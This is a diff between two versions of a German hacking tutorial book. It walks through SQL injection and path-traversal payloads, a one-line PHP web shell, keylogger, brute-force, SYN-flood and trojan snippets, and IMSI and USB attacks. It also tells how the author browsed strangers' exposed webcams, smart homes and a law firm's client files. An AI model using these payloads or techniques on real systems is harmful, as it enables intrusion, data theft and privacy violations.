-Password Attacks: Passwort Angriffe aller Art auf Passwort Hashes (= Prüfnummern) mit Brute Force (= Ausprobieren von Passwörtern) oder Wörterbuchangriffe.
-Wireless Attacks: Angriffe auf verschlüsselte WLANs. Mitschneiden der Kommunikation und knacken des Passworts.
-Reverse Engineering: Dort werden Anwendungen und Apps analysiert.
-Exploitation Tools: In dieser Kategorie sind Tools, die automatisiert Sicherheitslücken ausnutzen, um Zugriff auf ein System zu bekommen.
-Sniffing and Spoofing: Mitschneiden von Datenverkehr oder fälschen von Paketen.
-Post Exploitation: Was mache ich mit dem System, wenn ich Zugriff darauf habe? Hier geht es darum, wie ein dauerhafter Zugang zum Ziel gesichert wird.
-Forensic: Analyse von Datenträgern.
-Reporting Tools: Statistiken und Auswertungen.
-Social Engineering Tools: Phishing, gefälschte SMS und andere täuschende Maßnahmen.
+Information Gathering:Informationsbeschaffung. Welche Server werden benutzt? Welche Dienste laufen dort? Wie ist die Infrastruktur?
+Vulnerability Analysis:Ähnlich wie "Information Gathering". Die Tools sollen allerdings auch bekannte Sicherheitslücken ausspucken.
+Web Application AnalysisWebseiten auf Schwachstellen prüfen und auch automatisierte Tests durchführen.
+Database Assessment:In dieser Kategorie geht es um Datenbanken und hier kann automatisiert auf Schwachstellen getestet werden. Außerdem gibt es Crawler, die komplette Webseiten prüfen.
+Password Attacks:Passwort Angriffe aller Art auf Passwort Hashes (= Prüfnummern) mit Brute Force (= Ausprobieren von Passwörtern) oder Wörterbuchangriffe.
+Wireless Attacks:Angriffe auf verschlüsselte WLANs. Mitschneiden der Kommunikation und knacken des Passworts.
+Reverse Engineering:Dort werden Anwendungen und Apps analysiert.
+Exploitation Tools:In dieser Kategorie sind Tools, die automatisiert Sicherheitslücken ausnutzen, um Zugriff auf ein System zu bekommen.
+Sniffing and Spoofing:Mitschneiden von Datenverkehr oder fälschen von Paketen.
+Post Exploitation:Was mache ich mit dem System, wenn ich Zugriff darauf habe? Hier geht es darum, wie ein dauerhafter Zugang zum Ziel gesichert wird.
+Forensic:Analyse von Datenträgern.
+Reporting Tools:Statistiken und Auswertungen.
+Social Engineering Tools:Phishing, gefälschte SMS und andere täuschende Maßnahmen.
 
 Tor einrichten
 Ihr könnt Tor auch unter Kali installieren und mit proxychains nutzen. Proxychains wird vor ein Programm oder Befehl vorangestellt. Tor kann als transparenter Proxy eingerichtet werden, dadurch werden alle Verbindungen über Tor geleitet. Besser finde ich es, wenn alle anderen Verbindungen verboten werden. Damit fallen weniger Metadaten an und dir ist ganz bewusst, welches Tool gerade aktiv kommuniziert.
@@ -1708,8 +1695,7 @@ Einstellungen der Proxychains können wir ändern, aber als default ist sowieso 
 Wir testen kurz unsere öffentliche IP:
 >>> proxychains wget -qO - icanhazip.com
 
-Proxychains zeigt dir auch welche Anfragen gesendet werden. Dort fällt auch auf, dass der DNS Server als Default 4.2.2.2 ist. Wir möchten diesen gerne ändern. In meinem Beispiel benutze ich den DNS Server von Cloudflare. Es lassen sich aber auch andere offene DNS Server finden und einstellen.
-
+Proxychains zeigt dir auch welche Anfragen gesendet werden. Dort fällt auch auf, dass der DNS Server als Default 4.2.2.2 ist. Wir möchten diesen gerne ändern. In meinem Beispiel benutze ich den DNS Server von Cloudflare. Es lassen sich aber auch andere offene DNS Server finden und einstellen:
 >>> nano /usr/lib/proxychains3/proxyresolv
 
 Dort diese Zeile anpassen:
@@ -1739,7 +1725,7 @@ Danach ist es möglich die aktuellen Regeln dauerhaft zu speichern:
 >>> iptables-save > /etc/iptables/rules.v4
 >>> ip6tables-save > /etc/iptables/rules.v6
 
-Die Regeln der iptables um IPv6 zu blockieren, überlasse ich dir.
+Die Regeln der iptables um IPv6 zu blockieren, überlasse ich dir. Mit ufw wird es noch ein Stück einfacher. Das Ubuntu Wiki hilft auch hier.
 
 Falls du es iptables wieder zurück stellen möchtest, kannst du entweder auf deinen letzten Snapshot zurück gehen (den du hoffentlich gemacht hast) oder alle Regeln entfernen und wieder alles erlauben:
 >>> iptables -F
@@ -1828,9 +1814,11 @@ Sagen wir der/die PHP Entwickler/-in ist ganz frisch dabei und will eine Datenba
 
 Das Problem liegt bei WHERE id = $id;. Denn diese id kommt direkt aus dem GET Parameter. Jeder kann diesen Parameter in seiner Adresszeile im Browser ändern. Ich habe das auf meiner Laptop zum Testen aufgesetzt.
 
-Die URL: http://localhost:8888/php/sql.php?id=2
+Die URL
+http://localhost:8888/php/sql.php?id=2
 
-Wir werden nun die "id" etwas ändern: http://localhost:8888/php/sql.php?id=1%20AND%201=2
+Wir werden nun die "id" etwas ändern:
+http://localhost:8888/php/sql.php?id=1%20AND%201=2
 
 %20 sind Leerzeichen in der Adresszeile, also eigentlich steht dort: "1 AND 1=2" Damit ändern wir die SQL Query und machen eine logische Prüfung, ob 1=2 ist. Da diese Überprüfung fehlschlägt, bleibt der Inhalt auf der Seite leer.
 
@@ -1839,22 +1827,26 @@ Wir ändern es zur Gegenprüfung in "AND 1=1" und die Seite erscheint wieder nor
 Um die kompletten Inhalte aus der Datenbank damit auszulesen, müssen wir wissen, wie viele Spalten die Tabelle hat.
 
 Wir ändern die URL in:
-http://localhost:8888/php/sql.php?id=1%20order%20by%2010--.
+http://localhost:8888/php/sql.php?id=1%20order%20by%2010--
+
 Bedeutet: "id=1 order by 10". Die Seite bleibt leer, also probieren wir eine niedrigere Zahl. Dadurch tasten wir uns an die Spaltenanzahl heran. Die beiden Minus, würden den Rest der Query weg kommentieren. In meinem Beispiel wird der Inhalt bei "order by 4" angezeigt, aber bei "order by 5" nicht mehr. Das heißt, wir haben 4 Spalten in der Tabelle.
 
 Jetzt manipulieren wir die Query so, dass wir eine eigene Abfrage machen können, dabei ist wichtig, dass wir eine "falsche Id" verwenden, sodass nicht mehr die ID ausgegeben werden kann.
+
+
+
 
 W3schools sagt zu Union:
 The UNION operator is used to combine the result-set of two or more SELECT statements. Each SELECT statement within UNION must have the same number of columns.
 
 Wir hängen unser Statement an und wissen bereits die Anzahl der Spalten:
-localhost:8888/php/sql.php?id=-1 UNION ALL SELECT 1,2,3,4—
+http://localhost:8888/php/sql.php?id=-1 UNION ALL SELECT 1,2,3,4—
 
 Jetzt ist auf der Seite nur noch die Zahl 2 zu sehen. Dadurch wissen wir, dass die zweite Stelle auf der Webseite dargestellt wird. Das ist der Platz in unserer Liste, der die Ausgabe auf die Webseite zaubert.
 
 Ändern wir die 2 in @@version, können wir die Version der MySQL Datenbank auslesen.
 
-localhost:8888/php/sql.php?id=-1 UNION ALL SELECT 1,@@version,3,4--
+http://localhost:8888/php/sql.php?id=-1 UNION ALL SELECT 1,@@version,3,4--
 
 Im Test ist die MySQL Version 5.7.26. Das ist auch der Punkt an dem ich bei einem Test auf einer fremden Webseite aufhören würde. Das reicht aus, um das grundsätzliche Problem zu demonstrieren.
 
@@ -1895,7 +1887,6 @@ Die Sicherheitslücke wurde natürlich gemeldet und auch geschlossen. Trotzdem h
 
 Ich achte auch immer darauf, nur an nicht-kritischen Dateien zu probieren. In diesem Beispiel mit einem Werbebanner aus einem anderen Ordner.
 
-
 In der URL stand etwas wie: ?topic=topic.php. Ich änderte topic.php in ../../ um einige Ordner über den aktuellen Ordner zu kommen. In einem Linux System ist "../../../../../etc/passwd" eine gute Wahl. Dort stehen alle Benutzer drin. Falls der Webserver nur den Dateinamen einliest, aber die Endung .php selbst hinzufügt, dann kann der Pfad mit einem Null Byte %00 terminiert werden. Also /etc/passwd%00.
 
 Falls das Include extern eingerichtet ist, kann ich über den Pfad auch ein fremdes PHP Script einbinden. Die Möglichkeiten sind vielfältig. Tools wie Zed Attack Proxy helfen dabei und automatisieren viele Tests. Kompliziertere Bugs sind aber nur manuell zu finden.
@@ -1933,7 +1924,7 @@ Funknetzwerke mit schwachen Passwörtern können mit bestimmten Tools geknackt w
 
 In der laufenden Kali Linux VirtualBox über Devices das "Guest Additions CD Image" anklicken. Damit wird ein Image im CD-Laufwerk erkannt. Dort eine Shell starten und den angepassten Kernel installieren mit:
 
-sudo sh autorun.sh
+>>> sudo sh autorun.sh
 
 System neu starten.
 
@@ -1996,7 +1987,7 @@ Da steht jetzt die erste Speicheradresse und ich habe bereits gelesen, dass "aaa
 
 Mit "s" wie "seek" können wir zu Adressen springen und mit "pd 20" z.B. 20 Speicheradressen danach anzeigen lassen. "pd" bedeutet "print disassambly". Wir können alle Unterbefehle mit Fragezeichen aufrufen, also "s?" zeigt uns weitere Optionen zum Suchen-Befehl. Fragezeichen und Eingabe drücken zur Hilfe. Irgendwie kommen wir hier schon ans Ziel.
 
-Aus einem Tutorial habe ich die wichtigsten Befehle. Wir schauen uns erst alle Funktionen an:
+Aus einem Tutorial habe ich die wichtigsten Befehle. Schauen wir uns zuerst alle Funktionen an mit:
 afl
 
 Hier sehe ich "flag" als:
@@ -2023,7 +2014,6 @@ Ach so, das steht für "compare" also Vergleich. Der Vergleich geht schief und b
 In einer Funktionsbeschreibung zu Radare2 finde ich die visuelle Darstellung. Um den Ablauf visuell zu betrachten, tippen wir:
 VV @main
 
-Die Ausgabe:
 
 
 Wir sehen an dem roten "f" (= false) Pfad, dass wir dort hin müssen. Das bedeutet, dass derzeit der Vergleich immer wahr ist und bei "try harder" printf landet. Mit "q" wieder raus aus der Grafik.
@@ -2048,7 +2038,7 @@ pd1
 Ergebnis:
 0x00401642      817c241cc100.  cmp dword [var_8h], 0xc1
 
-Wunderbar, wir wollen den Vergleich ändern, sodass der Vergleich falsch wird und uns den kleinen Flag-Text zurück gibt. Die Idee: Wir ändern irgendetwas damit das Programm in den "false" Weg läuft. Wie mache ich das? In einem Write Up finde ich heraus, dass ich mit "w" anfangen muss. Schauen wir nach "w?" ins Terminal tippen zur Hilfe. Da erscheint eine große Liste der Befehle. Ein einfacher Weg ist es Bytes oder Dword zu erhöhen oder zu verringern. Im Prinzip +1 oder -1.
+Wunderbar, wir wollen den Vergleich ändern, sodass das Ergebnis des Vergleichs falsch wird und uns den kleinen Flag-Text zurück gibt. Die Idee: Wir ändern irgendetwas damit das Programm in den "false" Weg läuft. Wie mache ich das? In einem Write Up finde ich heraus, dass ich mit "w" anfangen muss. Schauen wir nach "w?" ins Terminal tippen zur Hilfe. Da erscheint eine große Liste der Befehle. Ein einfacher Weg ist es Bytes oder Dword zu erhöhen oder zu verringern. Im Prinzip +1 oder -1.
 
 Nachdem ich einfach hier und da ein paar Bytes geändert habe, um zu verstehen was da abgeht, fand ich bereits eine Möglichkeit. Nämlich "jmp" (= Jump) zu überschreiben, sodass die Ausgabe der Flag direkt aufgerufen wird. Allerdings zerstört das auch den kompletten Ablauf des Programms. Das geht sicherlich besser. Versuchen wir es direkt mit "cmp". Ich suche nach "Assembly Conditions" und finde einen Text auf Tutorialspoint. 
 
@@ -2067,7 +2057,7 @@ Pfuschen wir ein bisschen darin herum. Dazu kommt der "write" Befehl zum Einsatz
 w[1248][+-][n]       increment/decrement byte,word..
 
 Okay, wir wollen das nächste Byte reduzieren. "w1" schreibt ein Byte. Das "-" reduziert es. Reduziert wird um 1.
-w1- 1
+w1 -1
 
 Schauen wir nochmal nach:
 px1
@@ -2090,7 +2080,7 @@ Wow, es ging! Die Lösung ist doch nicht schlecht und mit dem Tool zu spielen ha
 Um eine Gegenprobe zu machen, dass ich diesen Teil richtig verstanden habe, werde ich die Bedingung umdrehen. Wir springen dazu nach "s 0x0040164a" dort steht: "jle 0x401653".
 
 Wir werden ein Byte reduzieren und es  trifft hoffentlich den passenden Befehl:
-w1-1
+w1 -1
 pd1
 > 0x0040164a      7d07           jge 0x401653
 
@@ -2104,7 +2094,7 @@ px1
 > c0
 
 c0 muss größer als c1 sein. Also erhöhen wir es um zwei:
-w1+2
+w1 +2
 px1
 > c2
 
@@ -2114,9 +2104,7 @@ Testen:
 wine Untitled1.exe 
 > flag{M3x1c4nMl4lw4r3_pl3rro}
 
-Cool, damit habe ich gerade einen Teil von Radare2, Assembler und diesem CrackMe verstanden. Außerdem bekam meine Wissensdatenbank ein paar neue Assembler Artikel dazu.
-
-Am Ende speichere ich mir die nützlichsten Befehle in eine eigene Datei:
+Cool, damit habe ich gerade einen Teil von Radare2, Assembler und diesem CrackMe verstanden. Außerdem bekam meine Wissensdatenbank ein paar neue Assembler Artikel dazu. Am Ende speichere ich mir die nützlichsten Befehle in eine eigene Datei:
 aaa = analyse binary
 pdf @main = print dissasembly function main
 s 0x00000000 = seek memory adress
@@ -2156,7 +2144,7 @@ Dort findet sich auch eine Warnung, dass die IP 192.168.2.108 doppelt eingericht
 Wir sehen nun auch DNS Anfragen und die Domain, die auf dem Zielrechner eingegeben wurde. Wir sehen wenn verschlüsselte Verbindungen zu Webseiten aufgebaut werden. Wir sehen alle unverschlüsselten Verbindungen direkt und können darin nach Informationen suchen. Ich sehe auch, wenn der Windows Rechner nach Updates sucht oder sonstige Telemetrie-Verbindungen aufbaut.
 
 Post Exploitation
-Wenn du Zugriff auf das System hast, willst du natürlich auch root Zugang auf die Maschine. Alles was nach dem Zugriff auf das System passiert ist "Post Exploitation". Das umfasst das Spuren verwischen, die genutzte Sicherheitslücke selbst schließen und dafür zu sorgen, dass dein Zugang dauerhaft ist. Du also immer wieder zurück zur Maschine kommen kannst.
+Wenn du Zugriff auf das System hast, willst du natürlich auch root Zugang auf die Maschine. Was nach dem Zugriff auf das System passiert ist "Post Exploitation". Das umfasst das Spuren verwischen, die genutzte Sicherheitslücke selbst schließen und dafür zu sorgen, dass dein Zugang dauerhaft ist. Du also immer wieder zurück zur Maschine kommen kannst.
 
 Außerdem umfasst es alle Tools, um Daten im System zu finden und herunterzuladen. Mimikatz findet Passwörter auf Windows Systemen. Du kannst nach weiteren Maschinen im lokale Netzwerk suchen, Netzwerkfreigaben und auch einen Keylogger für die normalen Benutzer der Maschine installieren.
 
@@ -2242,7 +2230,7 @@ function getRandom() {
     return str;
 }
 
-Der komplette Code ist auf Github: https://github.com/Leetcore/hackerz/blob/master/Phishing_Trasher.js
+Der komplette Code ist auf Github: https://github.com/Leetcore/wie-werde-ich-hacker/blob/master/scripts/Phishing_Trasher.js
 
 Die gehobene Variante wäre eine Abfrage an diese API: https://randomuser.me. Dort sind realistische Beispieldaten abrufbar. Darüber lassen sich zufällige Namen oder E-Mailadressen super generieren. Mein Beispiel-Script ist nicht wirklich effizient, allerdings kann die Webseite auch in mehreren Tabs geöffnet werden, was für gleichzeitige Anfragen sorgt.
 
@@ -2292,8 +2280,6 @@ Neben der Suche nach dieser speziellen Live Webcam lohnt es sich auch einfach di
 
 Sollte es ein Passwort geben, könnten wir im Internet herausfinden was das Standardpasswort für dieses Gerät ist. Aber wir erinnern uns: Logins und Passwörter "umgehen" ist illegal. In keinem meiner gezeigten Beispiel war ein Passwort notwendig. Mit der IP-Adresse sind die Webserver erreichbar bzw. erreichbar gewesen.
 
-…
-
 Währenddessen hat mein Web Scanner ein Lenovo Media Center ohne Passwortabfrage gefunden. Das ist auch ein Punkt auf meiner Bucket List, den ich unbedingt abhaken wollte:
 
 [x] Fremdes, ungesichertes Media Center im Internet finden und dann Justin Bieber hören.
@@ -2336,20 +2322,21 @@ except:
     # ignore all errors
     pass
 
-Kompletter Quellcode: https://github.com/Leetcore/hackerz/blob/master/webscanner.py
+Kompletter Quellcode: https://github.com/Leetcore/wie-werde-ich-hacker/blob/master/scripts/webscanner.py
 
 Interessanter wird es, wenn plötzlich die Konfiguration einer Wärmepumpe auftaucht, die ich ohne irgendwelche Passwortabfragen an- und ausschalten kann.
 
 Noch lustiger ist es, wenn das ganze Smart Home erreichbar ist und diverse Lampen vom Internet aus gesteuert werden können. Ich spreche kein italienisch, aber mein Übersetzungstool bestätigt mir, dass im "Wohnzimmer" das Licht an ist und ich es abschalten könnte.
 
-Das ist aber nichts im Vergleich zum nächsten Fund, den mein Web Scanner ausgespuckt hat: Ein ungeschützter Netzwerkspeicher (Iomega StorCenter) einer italienischen Anwaltskanzlei. Wir sind offensichtlich in einer italienischer IP-Range. Dort finden sich Rechnungen aus den letzten Jahren, persönliche Unterlagen, Urteile und Beweis Screenshots aus WhatsApp, die für einen Sorgerechtsstreit relevant waren. Gescannte Gerichtsunterlagen und Kundendaten sind auch noch dabei.
+Das ist aber nichts im Vergleich zum nächsten Fund, den mein Web Scanner ausgespuckt hat: Ein ungeschützter Netzwerkspeicher (Iomega StorCenter) einer italienischen Anwaltskanzlei.
+
+Wir sind offensichtlich in einer italienischer IP-Range. Dort finden sich Rechnungen aus den letzten Jahren, persönliche Unterlagen, Urteile und Beweis Screenshots aus WhatsApp, die für einen Sorgerechtsstreit relevant waren. Gescannte Gerichtsunterlagen und Kundendaten sind auch noch dabei.
 
 
 
 Hier mache ich mir die Mühe und versuche den Betreiber anonym zu kontaktieren. Seine E-Mailadresse, Telefonnummer und Anschrift habe ich bereits. Dafür musste ich mir eine weitere E-Mailadresse anlegen, denn der Anwalt wird nicht gerade froh darüber sein, dass seine Daten die ganze Zeit offen im Internet liegen. Ich will nicht der Sündenbock werden. Als Kopie schicke ich die Mail in CC auch an den Provider. Vielleicht ist irgendjemand so gütig und nimmt die Daten aus dem Netz.
 
 Aber wie so oft, passierte nichts. Ich weiß nicht, ob die Mailadresse noch aktuell ist oder ob die Mail überhaupt gelesen wurde. Der Provider interessiert sich auch nicht dafür. Abuse Mails hatte ich verschickt.
-
 …
 
 Eine Zeit verging. Ich schrieb weiter am Buch und schaue zwischendurch wieder vorbei. Der Stand im Januar 2020. Jemand hat die Daten gelöscht und eine TXT Datei hinterlassen: Sie hätten die Daten "verschlüsselt" und sie Bitcoins zahlen sollen, damit sie diese Daten wieder bekommen.
@@ -2413,7 +2400,7 @@ for port in range(1,1337):
          print "Port open: " + str(port)
     sock.close()
 
-https://github.com/Leetcore/hackerz/blob/master/portscanner.py
+https://github.com/Leetcore/wie-werde-ich-hacker/blob/master/scripts/portscanner.py
 
 Wenn wir z.B. aktive SQL Dienste scannen, könnten wir als nächsten Schritt versuchen eine Verbindung herzustellen. So ist es möglich schlecht gesicherte Datenbanken automatisch zu übernehmen.
 
@@ -2504,6 +2491,7 @@ Da PHP auf vielen Webservern läuft, kann ein Angreifer den Server immer wieder 
 
 Kali Linux hat Weevely dabei, dass eine PHP Datei erstellt, die entsprechend auf den Web Server hochgeladen werden muss. Diese Backdoor sollte passwortgeschützt sein. Danach kann sich der Angreifer damit verbinden. "man weevely" erklärt eigentlich alles.
 
+
 Die einfachste Version einer PHP Backdoor ist das hier:
 <?php echo system($_GET["cmd"]); ?>
 
@@ -2542,7 +2530,7 @@ Mit diesem Schnipsel bekommen wir direkt nach dem Eintippen, einen Request mit g
 
 Wir setzen dazu einen Event-Listener auf "keyup", der direkt nach dem eintippen ausgelöst wird. Danach suchen wir alle "Input"-Formularfelder heraus und wenn es einen "value" des Feldes gibt, hängen wir ein "img" Bild an die Seite an, was mit "display: none" nicht dargestellt, aber trotzdem geladen wurde. Dieser Request enthält die Daten aus dem Formularfeld. Je nachdem wie die Webseite und das Login-Formular aufgebaut ist, muss das Keylogger-Script darauf angepasst werden.
 
-https://github.com/Leetcore/hackerz/blob/master/Keylogger.js
+Code auf Github: https://github.com/Leetcore/wie-werde-ich-hacker/blob/master/scripts/Keylogger.js
 
 Web Logins knacken
 Es gibt einige Tools, um Web Logins zu hacken. Es wäre denkbar über eine SQL Injection oder durch das automatisierte Ausprobieren von Passwörtern. Der entscheidende Faktor dabei heißt Zeit. Das stumpfe Ausprobieren von Passwörtern muss lange dauern, damit es sich nicht lohnt. Deshalb ist es wichtig, dass Passwörter möglichst lang sind. Statt einem Passwort sollte sowieso an eine Passphrase (Geheimsatz) gedacht werden. Der ist leichter zu merken, aber für den Computer schwerer zu knacken.
@@ -2619,10 +2607,10 @@ for word in wordsarray:
       print('pw is: ' + word)
       break
 
-Code auf Github: https://github.com/Leetcore/hackerz/blob/master/webloginwordlist.py.
+Code auf Github: https://github.com/Leetcore/wie-werde-ich-hacker/blob/master/scripts/webloginwordlist.py
 
 Das Ergebnis, wenn ich das Script ausführe:
->>> python3 webloginwordlist.py pw is: pw123456
+>>> python3 webloginwordlist.pypw is: pw123456
 
 In diesem Fall ist der Code relativ simple. Allerdings gibt es Login Prozesse, die deutlich komplizierter funktionieren. Noch schwieriger wird es, wenn das Login nur funktioniert, wenn JavaScript aktiviert ist und die Token Generierung aus verschiedenen Quellen kommen.
 
@@ -2644,7 +2632,7 @@ Formular abschicken.
 
 Die Selektoren müssen auf die jeweilige Webseite angepasst werden, aber an meinem lokalen Beispiel funktioniert es sehr schön.
 
-https://github.com/Leetcore/hackerz/blob/master/js-pw-checker.js
+Code auf Github: https://github.com/Leetcore/wie-werde-ich-hacker/blob/master/scripts/js-pw-checker.js
 
 Solche Angriffe laufen auch ständig gegen Wordpress Blogs. Wenn ein Passwort für einen Administrator gefunden wurde, lässt sich der Blog auch automatisiert übernehmen. Wer Admin-Rechte hat, kann auch eine PHP-Backdoor hochladen, sodass Befehle auf dem Server ausgeführt werden können. Damit ich ein Ziel zum Testen habe, gibt es verwundbare Server bei Diensten wie "Hack In The Box". Dort könnt ihr euch ein Server mit Login und Passwort suchen und auch "hydra" aus Kali Linux legal ausprobieren.
 
@@ -2697,8 +2685,7 @@ Wenn das Exploit ausgewählt ist, kann es mit "show options" konfiguriert werden
 RHOSTS:
 The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
 
-Bei RHOSTS reicht eine IP-Adresse, falls ein Massenscan ausgeführt wurde, kann dort eine Datei mit der Liste aller Ziele übergeben werden.
-
+Bei RHOSTS reicht eine IP-Adresse, falls ein Massenscan ausgeführt wurde, kann dort eine Datei mit der Liste aller Ziele übergeben werden:
 >>> set RHOSTS 10.10.159.121
 
 Jetzt sind alle Optionen gesetzt und ich kann den Befehl "exploit" eintippen und damit den Angriff starten. Am Ende landen wir in der CMD Windows Shell. Das Ziel ist es eine vollständige Metapreter Shell zu bekommen.
@@ -2782,7 +2769,7 @@ Wir sollten uns eine Liste mit aktiven IPs schreiben, damit diese ihre Pakete an
 
 packet = IP(src=spoofIP,dst=destIP,ttl=99)/TCP(sport=80,dport=port,seq=12345,ack=1000,window=1000,flags="S")
 
-spoofIP ist die IP des Ziels. Als destIP kommt die aktive IP aus der Liste. Soweit zur Theorie. Da ich keine Probleme verursachen will, kann ich es nicht unter realen Bedingungen testen. Deshalb begnüge ich mich mit meinem Beispielcode: https://github.com/Leetcore/hackerz/blob/master/syn_ddos_flood.py
+spoofIP ist die IP des Ziels. Als destIP kommt die aktive IP aus der Liste. Soweit zur Theorie. Da ich keine Probleme verursachen will, kann ich es nicht unter realen Bedingungen testen. Deshalb begnüge ich mich mit meinem Beispielcode: https://github.com/Leetcore/wie-werde-ich-hacker/blob/master/scripts/syn_ddos_flood.py
 
 Mein Internetprovider sollte übrigens dafür sorgen, dass gefälschte Absenderadressen aus einer anderen Range nicht weitergeleitet werden. Aber die Erde ist groß und es gibt auch andere Internetprovider…
 
@@ -2875,6 +2862,7 @@ Unser Trojaner wird sich CMD Befehle von meiner Webseite herunterladen und ausf�
 Ich lege auf meinen Webserver eine HTML Datei in der nur "calc.exe" steht. Das öffnet den Taschenrechner. Das reicht als erste Demo.
 
 In meinem Projekt-Explorer klicke ich den Haken vor der "MainWindow.xaml" an und sehe dadurch die C# Datei. Nach dem Funktionsaufruf "InitializeComponent();" starten wir den Download des Befehls.
+
 
 using (WebClient client = new WebClient())
 {
@@ -2975,7 +2963,7 @@ Neustart von vorne.
 
 Die Schwierigkeit bestand erstmal darin, dass der Kompass richtig funktioniert. Ich hatte ein Beispiel aus dem Internet, was nicht unbedingt meinem Wunsch entsprach. Aus irgendeinem Grund funktioniert auch das neigen nach links bei mir nicht. Das wird nicht als Westen erkannt. Entweder versteckt sich dort ein Bug, den ich erst finden muss oder der Chip will nicht so wie ich.
 
-Wie auch immer, hier ist der Code dafür: https://github.com/Leetcore/hackerz/blob/master/calliope-mini.js
+Wie auch immer, hier ist der Code dafür: https://github.com/Leetcore/wie-werde-ich-hacker/blob/master/scripts/calliope-mini.js
 
 Pi-Hole
 Als erstes Projekt mit dem "Raspberry Pi" habe ich mir einen Ad-Blocker vorgenommen. Bisher spielte ich auf dem Pi nur Retro Games z.B. Super Nintendo. Aber wir können auch etwas Nützliches damit machen. Pi-Hole hört sich nach irgendeiner sexuelle Praktik an, doch der Name soll bedeuten, dass dort Werbung in einem schwarzen Loch verschwindet. Der Raspberry Pi dient dabei als DNS-Server mit einer Blockliste, der bestimmte Werbe-Server blockiert. Netzsperren für Werbung quasi.
@@ -3008,8 +2996,7 @@ Nochmal zur Erinnerung, ihr könnt im Pi alle aufgerufenen Domains sehen. Geheim
 Fazit: Die Installation war wirklich sehr einfach. Da die Kiste im internen Netzwerk hängt, ist das Risiko auch gering. Trotzdem wäre es für den Dauerbetrieb noch schön, wenn unter Debian dazu ein automatisches Update aktiviert werden würde. Eine Websuche nach "raspian automatic updates" bringt dir einen Stackoverflow Beitrag, der das Update mit crontab automatisiert. Kannst du machen, es geht mit "unattended-upgrades" allerdings einfacher:
 >>> apt install unattended-upgrades
 
-Automatische Installation von Sicherheitsaktualisierungen
-Dieses Paket kann automatisch und unbeaufsichtigt Sicherheitsaktualisierungen herunterladen und installieren. Es wird darauf achten, dass nur Pakete der voreingestellten APT-Quelle installiert werden. Auch Nachfragen von dpkg wegen Änderungen an Konfigurationsdateien werden beantwortet.
+Automatische Installation von Sicherheitsaktualisierungen: Dieses Paket kann automatisch und unbeaufsichtigt Sicherheitsaktualisierungen herunterladen und installieren. Es wird darauf achten, dass nur Pakete der voreingestellten APT-Quelle installiert werden. Auch Nachfragen von dpkg wegen Änderungen an Konfigurationsdateien werden beantwortet.
 
 WLAN Richtfunk
 In einem Mehrfamilienhaus gibt es schnell Probleme mit langsamen WLANs, weil sich die Geräte der Nachbarn gegenseitig stören. Meistens lässt sich das Problem mit dem Wechseln des Kanals beheben. Mit einer Richtfunkantenne im Eigenbau werden wir die Reichweite erhöhen, was nützlich ist um auf entferntere Netzwerke zuzugreifen.
@@ -3098,7 +3085,7 @@ In die Shell tippen:
 
 ARFCN stellt sich nach einer Internetsuche als "Absolute radio-frequency channel number" heraus. Frequenz ist klar. CID bedeutet "Cell ID". LAC bedeutet "location area identity". MMC ist der "mobile country code". MNC ist der "mobile network code". Das heißt, wir wissen jetzt welche Basis-Station es gibt und auf welcher Frequenz die Kommunikation stattfindet. Diese Frequenz notieren wir oder lassen diese Shell offen.
 
-Mit dem Befehl "grgsm_livemon -f xxx.xM" (-f steht für Frequenz) monitoren wir alles was auf der angegebenen Frequenz passiert:
+Mit dem Befehl "grgsm_livemon -f xxx.xM" (-f steht für Frequenz) monitoren wir alles auf der angegebenen Frequenz:
 >>> grgsm_livemon -f xxx.xM
 
 Wir starten den IMSI-Catcher in einer zweiten Shell:
@@ -3152,7 +3139,7 @@ Diese Grundfunktion reicht, um einen USB-Angriff zu demonstrieren. Wenn das Ziel
 
 Allerdings ist das Teensy-Board an sich ziemlich auffällig. Wer sich als normaler USB-Stick tarnen will, der kauft sich einen "USB RUBBER DUCKY". Das Gerät kann das gleiche, sieht aber wie ein USB-Stick aus, hat Anschlüsse für eine MicroSD und ist leider derzeit ausverkauft. Ich werde dafür aber keine 90 Euro auf Amazon ausgeben.
 
-Ein Toolkit, das bereits einige fertige Angriffe hat, gibt es auf Github:
+Ein Toolkit, das bereits einige Angriffe hat, gibt es auf Github:
 Brutal is a toolkit to quickly create various payload, powershell attack, virus attack and launch listener for a Human Interface Device
 
 Brutal Github: https://github.com/Screetsec/Brutal. Ein anderes Backdoor Script gibt es auf: https://github.com/offensive-security/hid-backdoor-peensy.
@@ -3229,10 +3216,10 @@ Stellt sich heraus, dass es nicht so mega sicher war, einen einzigen Nutzer mit 
 Berühmte Songs:
 The root is on fire.
 Highway to Shell.
-We Didn’t Start the Firewall.
+We didn’t start the firewall.
 Wake me up before you GOTO 10.
 Callback me maybe.
-Sexy Backlog.
+Sexy backlog.
 
 Berühmte Filme:
 grep -r nemo.
@@ -3246,7 +3233,7 @@ Filmtitel: Alte Programmiersprache + angeborener Mechanismus zur Verhaltenssteue
 
 Künstlername: Europäische Trägerrakete + Größenbeschreibung eines Pappbechers?
 
-Künstlername: Weiblicher Vorname + Wichtiger Bestandteil der Kryptographie?
+Künstlername: Weiblicher Vorname + Wichtiger Bestandteil der Kryptografie?
 
 Bandname: Tool, um Daten im Netzwerk zu synchronisieren. Anderer Anfangsbuchstabe?
 
@@ -3254,14 +3241,14 @@ Bandname: Elektronischer Datenspeicher + harte Materie?
 
 Künstlername: Bekannter Webserver 11001111.
 
-Die Lösungen der Rätselecke stehen am Ende des Buches.
-
-Ausblick
+Die Lösungen der Rätselecke stehen am Ende des Buches.Ausblick
 Einmal durchatmen. Für mich persönlich hat sich die Tipparbeit an diesem Buch gelohnt. Ich habe mich wieder mit spannenden Themen auseinander gesetzt und Neues gelernt. Vor allem habe ich meine persönliche Hürde ein neues Thema anzufangen erneut gesenkt.
 
 Das Internet vernetzt immer mehr Geräte und soll unseren Alltag einfacher machen. Das ist auf der einen Seite toll, aber auf der anderen Seite gibt es auch immer wieder Datenschutz- und Sicherheitsproblemen. Aus Sicht der Hacker/-innen wird der öffentliche Spielplatz immer größer.
 
-Dieses Buch hat dafür gesorgt, dass ich meinen Traum vom beruflichen Hacking wiederbeleben wollte. Meine Idee war Live Hacking und Vorträge anzubieten. Daraufhin bin ich auf ein Cybersecurity Startup in der Region gestoßen und arbeite seitdem dort.
+Vielen Dank für deine Aufmerksamkeit.
+
+Vielen Dank an meine Frau, Noxmiles, DanielBilanovic, unbelauscht und ytvwld für Hinweise auf Tippfehler und Verbesserungen.
 
 Die Lösungen für die Rätselecke:
 Basic Instinct.
